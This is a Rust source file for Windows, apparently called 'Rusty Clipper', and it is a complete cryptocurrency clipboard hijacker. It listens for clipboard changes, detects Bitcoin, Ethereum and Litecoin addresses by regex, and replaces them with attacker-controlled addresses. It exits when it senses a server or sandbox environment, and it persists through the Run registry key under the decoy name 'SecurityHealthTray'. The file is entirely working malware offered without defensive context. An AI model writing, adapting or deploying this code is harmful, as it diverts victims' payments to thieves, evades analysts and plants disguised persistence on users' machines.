#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
mod constants;
use std::{collections::HashMap, error::Error, ffi::CStr, path::Path, process};

use regex::Regex;
use sysinfo::{ProcessExt, System, SystemExt};
use winapi::{
    ctypes::c_void,
    shared::{
        minwindef::{HINSTANCE, LPARAM, LRESULT, UINT, WPARAM},
        ntdef::NULL,
        windef::{HWND, POINT},
    },
    um::{
        libloaderapi::GetModuleHandleA,
        winbase::{GlobalAlloc, GlobalLock, GlobalUnlock, GMEM_MOVEABLE},
        winnt::RtlCopyMemory,
        winuser::{
            AddClipboardFormatListener, CloseClipboard, CreateWindowExA, DefWindowProcA,
            DispatchMessageA, EmptyClipboard, GetClipboardData, GetMessageA, OpenClipboard,
            PostQuitMessage, RegisterClassExA, RemoveClipboardFormatListener, SetClipboardData,
            CF_TEXT, CS_DBLCLKS, CS_HREDRAW, CS_VREDRAW, MSG, WM_CLIPBOARDUPDATE, WM_DESTROY,
            WNDCLASSEXA, WS_OVERLAPPEDWINDOW,
        },
    },
};
use winreg::{enums::HKEY_CURRENT_USER, RegKey};
use wmi::{COMLibrary, Variant, WMIConnection};

unsafe fn clipboard_update(hwnd: HWND) {
    if OpenClipboard(hwnd) == 0 {
        return;
    }

    let h_data = GetClipboardData(CF_TEXT);

    if h_data == NULL {
        return;
    }

    let p_mem = GlobalLock(h_data);

    if p_mem == NULL {
        return;
    }

    let text = CStr::from_ptr(p_mem as *const i8).to_str().ok();

    if let Some(text) = text {
        let btc_regex =
            Regex::new("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$").unwrap();
        let eth_regex = Regex::new("0x[a-fA-F0-9]{40}").unwrap();
        let ltc_regex = Regex::new("[LM3Q2mn][a-km-zA-HJ-NP-Z1-9]{26,34}").unwrap();

        let address = if btc_regex.is_match(text) {
            Some(constants::BITCOIN_ADDRESS)
        } else if eth_regex.is_match(text) {
            Some(constants::ETHEREUM_ADDRESS)
        } else if ltc_regex.is_match(text) {
            Some(constants::LITECOIN_ADDRESS)
        } else {
            None
        };

        if let Some(address) = address {
            let len = address.len() + 1;
            let h_mem = GlobalAlloc(GMEM_MOVEABLE, len);
            RtlCopyMemory(GlobalLock(h_mem), address.as_ptr() as *const c_void, len);
            GlobalUnlock(h_mem);
            EmptyClipboard();
            SetClipboardData(CF_TEXT, h_mem);
        }
    }

    GlobalUnlock(h_data);
    CloseClipboard();
}

pub unsafe extern "system" fn window_proc(
    hwnd: HWND,
    msg: UINT,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if msg == WM_DESTROY {
        PostQuitMessage(0);
        RemoveClipboardFormatListener(hwnd);
        return 0;
    } else if msg == WM_CLIPBOARDUPDATE {
        clipboard_update(hwnd);
    }
    return DefWindowProcA(hwnd, msg, w_param, l_param);
}

fn detect_analysis_environment() -> Result<(), Box<dyn std::error::Error>> {
    let con = WMIConnection::new(COMLibrary::new()?.into())?;
    let results: Vec<HashMap<String, Variant>> =
        con.raw_query("SELECT ProductType FROM Win32_OperatingSystem")?;

    for result in results {
        for value in result.values() {
            if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
                process::exit(0);
            }
        }
    }

    let results: Vec<HashMap<String, Variant>> =
        con.raw_query("SELECT * FROM Win32_CacheMemory")?;

    if results.len() < 2 {
        process::exit(0);
    }

    let mut system = System::new();
    system.refresh_all();

    for (_, process) in system.processes() {
        if let Some(arg) = process.cmd().get(0) {
            let path = Path::new(arg);

            match path.file_stem() {
                Some(file_name) => {
                    if file_name.len() == 64 {
                        process::exit(0);
                    }
                }
                None => (),
            }
        }
    }

    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    // Method to decrypt analysis environment
    detect_analysis_environment()?;

    // Adds the current executable to startup
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let startup_key = hkcu.open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")?;

    let current_exe_env = std::env::current_exe()?;
    let current_path = current_exe_env.as_os_str();
    startup_key.set_value("SecurityHealthTray", &current_path)?;

    // Creates a window and registers it as a ClipboardFormatListener
    unsafe {
        let sz_class_name = "#32769";

        let wc = WNDCLASSEXA {
            cbSize: std::mem::size_of::<WNDCLASSEXA>() as UINT,
            style: CS_HREDRAW | CS_VREDRAW | CS_DBLCLKS,
            lpfnWndProc: Some(window_proc),
            cbClsExtra: 0,
            cbWndExtra: 0,
            hInstance: GetModuleHandleA(std::ptr::null_mut()) as HINSTANCE,
            hIcon: std::ptr::null_mut(),
            hCursor: std::ptr::null_mut(),
            hbrBackground: std::ptr::null_mut(),
            lpszMenuName: std::ptr::null_mut(),
            lpszClassName: sz_class_name.as_ptr() as *const i8,
            hIconSm: std::ptr::null_mut(),
        };

        if RegisterClassExA(&wc) == 0 {
            return Ok(());
        }

        let window_name = "Rusty Clipper";

        // Creates a new window
        let hwnd = CreateWindowExA(
            0,
            wc.lpszClassName,
            window_name.as_ptr() as *const i8,
            WS_OVERLAPPEDWINDOW,
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            wc.hInstance,
            std::ptr::null_mut(),
        );

        if hwnd == std::ptr::null_mut() {
            return Ok(());
        }

        // Registers the window to receive clipboard updates
        AddClipboardFormatListener(hwnd);

        let mut msg = MSG {
            hwnd: std::ptr::null_mut(),
            message: 0,
            wParam: 0,
            lParam: 0,
            time: 0,
            pt: POINT { x: 0, y: 0 },
        };

        // Dispatch all messages to window_proc
        loop {
            let res = GetMessageA(&mut msg, std::ptr::null_mut(), 0, 0);

            if res == 0 || res == -1 {
                break;
            }
            DispatchMessageA(&msg);
        }
    };

    Ok(())
}
